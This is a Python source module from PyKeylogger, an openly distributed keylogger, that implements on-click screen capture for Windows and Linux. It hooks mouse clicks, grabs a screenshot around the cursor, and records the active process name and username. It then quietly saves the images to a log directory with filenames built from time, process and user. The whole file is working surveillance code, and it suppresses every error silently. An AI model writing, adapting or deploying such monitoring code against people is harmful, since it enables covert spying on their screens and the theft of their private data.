##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2009  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

from baseeventclasses import *

from myutils import (_settings, _cmdoptions, OnDemandRotatingFileHandler,
    to_unicode)
from Queue import Queue, Empty
import os
import os.path
import logging
import re
import copy
import Image
import datetime

if os.name == 'nt':
    import win32api, win32con, win32process
    import ImageGrab
elif os.name == 'posix':
    from Xlib import X, XK, display, error
    from Xlib.ext import record
    from Xlib.protocol import rq


class OnClickImageCaptureFirstStage(FirstStageBaseEventClass):
    '''On-click image capture, first stage: prepare data.
    
    Grabs mouse events, captures desired screen area, 
    finds the process name and username, then 
    passes the event on to the second stage.
    '''

    def __init__(self, *args, **kwargs):
        
        FirstStageBaseEventClass.__init__(self, *args, **kwargs)
        
        self.task_function = self.process_event

        self.imagedimensions = \
           Point(self.subsettings['General']['Click Image Width'],
                 self.subsettings['General']['Click Image Height'])
                 
        # Hook to our display.
        if os.name == 'posix':
            self.local_dpy = display.Display()

    def process_event(self):
        try:
            event = self.q.get(timeout=0.05)
            if event.MessageName.startswith("mouse left") or \
                    event.MessageName.startswith("mouse middle") or \
                    event.MessageName.startswith("mouse right"):
                self.logger.debug(self.print_event(event))
                process_name = self.get_process_name(event)
                username = self.get_username()
                image_data = self.capture_image(event)
                self.sst_q.put((process_name, image_data, username, event))
            else:
                self.logger.debug('not a useful event')
        except Empty:
            pass
        except:
            self.logger.debug("some exception was caught in the "
                "imagecapture loop...\nhere it is:\n", exc_info=True)
            pass #let's keep iterating
            

    def capture_image(self, event):
        screensize = self.get_screen_size()

        # The cropbox will take care of making sure our image is within
        # screen boundaries.
        cropbox = CropBox(topleft=Point(0,0),
                          bottomright=self.imagedimensions,
                          min=Point(0,0),
                          max=screensize)
        cropbox.reposition(Point(event.Position[0], event.Position[1]))
        
        self.logger.debug(cropbox)
                
        if os.name == 'posix':
            
            AllPlanes = ~0

            try:
                # cropbox.topleft.x, cropbox.topleft.y,
                # cropbox.size.x, cropbox.size.y, self.savefilename
                raw = self.rootwin.get_image(cropbox.topleft.x, 
                        cropbox.topleft.y, cropbox.size.x, cropbox.size.y, 
                        X.ZPixmap, AllPlanes)
                image_data = Image.fromstring("RGBX", (cropbox.size.x, cropbox.size.y), raw.data, "raw", "BGRX").convert("RGB")
                return image_data
            except error.BadDrawable:
                print "bad drawable when attempting to get an image!  Closed the window?"
            except error.BadMatch:
                print "bad match when attempting to get an image! probably specified an area outside the window (too big?)"
            except error.BadValue:
                print "getimage: bad value error - tell me about this one, I've not managed to make it happen yet"
            except:
                print self.logger.debug('Error in getimage.',
                        exc_info = True)
        
        if os.name == 'nt':
            image_data = ImageGrab.grab((cropbox.topleft.x, cropbox.topleft.y, cropbox.bottomright.x, cropbox.bottomright.y))
            return image_data

    def get_screen_size(self):
        if os.name == 'posix':
            self.rootwin = \
               self.local_dpy.get_input_focus().focus.query_tree().root
            if self.rootwin == 0:
                self.rootwin = self.local_dpy.get_input_focus()
            return Point(self.rootwin.get_geometry().width,
                         self.rootwin.get_geometry().height)
        if os.name == 'nt':
            return Point(win32api.GetSystemMetrics(0),
                         win32api.GetSystemMetrics(1))
    
    def get_username(self):
        '''Try a few different environment vars to get the username.'''
        username = None
        for varname in ['USERNAME','USER','LOGNAME']:
            username = os.getenv(varname)
            if username is not None:
                break
        if username is None:
            username = 'none'
        return username

    def get_process_name(self, event):
        '''Acquire the process name from the window handle for use in the log filename.
        '''
        if os.name == 'nt':
            hwnd = event.Window
            try:
                threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
                
                # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
                
                mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
                procname = win32process.GetModuleFileNameEx(mypyproc, 0)
                return procname
            except:
                # this happens frequently enough - when the last event caused the closure of the window or program
                # so we just return a nice string and don't worry about it.
                return "noprocname"
        elif os.name == 'posix':
            return to_unicode(event.WindowProcName)

    def print_event(self, event):
        '''Prints the event.
            
            We need this because pyhook's event don't have a default __str__
            method, so we check for os type, and make it work on windows.
        
            '''
        if os.name == 'posix':
            return to_unicode(event)
        if os.name == 'nt':
            str_tpl = "Window: %s\n" + \
                      "Window Handle: %s\n" + \
                      "Window's Process Name: %s\n" + \
                      "Position: %s\n" + \
                      "MessageName: %s\n"
            return str_tpl % (to_unicode(event.Window),
                              to_unicode(event.WindowName),
                              to_unicode(self.get_process_name(event)),
                              to_unicode(event.Position),
                              to_unicode(event.MessageName))


    def spawn_second_stage_thread(self): 
        self.sst_q = Queue(0)
        self.sst = OnClickImageCaptureSecondStage(self.dir_lock, 
                self.sst_q, self.loggername)

    

class OnClickImageCaptureSecondStage(SecondStageBaseEventClass):
    '''On-click image capture, second stage: write data.
    
    Write the image data to file in log directory.
    '''
    def __init__(self, dir_lock, *args, **kwargs):
        SecondStageBaseEventClass.__init__(self, dir_lock, *args, **kwargs)
        
        self.task_function = self.process_event
        
        # Regexp filter for the non-allowed characters in windows filenames.
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")

    def process_event(self):
        try:
            #need the timeout so that thread terminates properly when exiting
            (process_name, image_data, username, event) = self.q.get(timeout=0.05)
            process_name = self.filter.sub(r'__', process_name)
            savefilename = os.path.join(\
                self.settings['General']['Log Directory'],
                self.subsettings['General']['Log Subdirectory'],
                self.parse_filename(username, process_name))
            image_data.save(savefilename, 
                quality=self.subsettings['General']['Click Image Quality'])
        except Empty:
            pass
        except:
            self.logger.debug('Error writing image to file',
                            exc_info=True)

    def parse_filename(self, username, process_name):
        filepattern = self.subsettings['General']['Click Image Filename']
        fileextension = self.subsettings['General']['Click Image Format']
        filepattern = re.sub(r'%time%', 
                datetime.datetime.today().strftime('%Y%m%d_%H%M%S_') + \
                str(datetime.datetime.today().microsecond), 
                filepattern)
        filepattern = re.sub(r'%processname%', process_name, filepattern)
        filepattern = re.sub(r'%username%', username, filepattern)
        filepattern = filepattern + '.' + fileextension
        return filepattern

class Point:
    def __init__(self, x=0, y=0):
        self.x = x
        self.y = y
    def move(self, xmove=0, ymove=0):
        self.x = self.x + xmove
        self.y = self.y + ymove
    def __str__(self):
        return "[%d,%d]" % (self.x, self.y)
    def __add__(self, other):
        return Point(self.x+other.x, self.y+other.y)
    def __sub__(self, other):
        return Point(self.x - other.x, self.y - other.y)


class CropBox:
    def __init__(self,
                 topleft=Point(0,0),
                 bottomright=Point(100,100),
                 min=Point(0,0),
                 max=Point(1600,1200)):
        self.topleft = copy.deepcopy(topleft)
        self.bottomright = copy.deepcopy(bottomright)
        self.min = copy.deepcopy(min)
        self.max = copy.deepcopy(max)
        self.size = self.bottomright - self.topleft
        self.maxsize = self.max - self.min
        # make sure our box is not bigger than the whole image
        if (self.size.x > self.maxsize.x):
            self.bottomright.x = \
               self.bottomright.x - self.size.x + self.maxsize.x
        if (self.size.y > self.maxsize.y):
            self.bottomright.y = \
               self.bottomright.y - self.size.y + self.maxsize.y
        self.center = Point(self.size.x/2 + self.topleft.x,
                            self.size.y/2 + self.topleft.y)
        
    def move(self, xmove=0, ymove=0):
        # make sure we can't move beyond image boundaries
        if (self.topleft.x + xmove < self.min.x):
            xmove = self.topleft.x - self.min.x
        if (self.topleft.y + ymove < self.min.y):
            ymove = self.topleft.y - self.min.y
        if (self.bottomright.x + xmove > self.max.x):
            xmove = self.max.x - self.bottomright.x
        if (self.bottomright.y + ymove > self.max.y):
            ymove = self.max.y - self.bottomright.y
        self.topleft.move(xmove, ymove)
        self.bottomright.move(xmove, ymove)
        self.center = Point(self.size.x/2 + self.topleft.x,
                            self.size.y/2 + self.topleft.y)
        #print self.center
    
    def reposition(self, newcenter = Point(500,500)):
        motion = newcenter - self.center
        self.move(motion.x, motion.y)
    
    def __str__(self):
        return str(self.topleft) + str(self.bottomright)
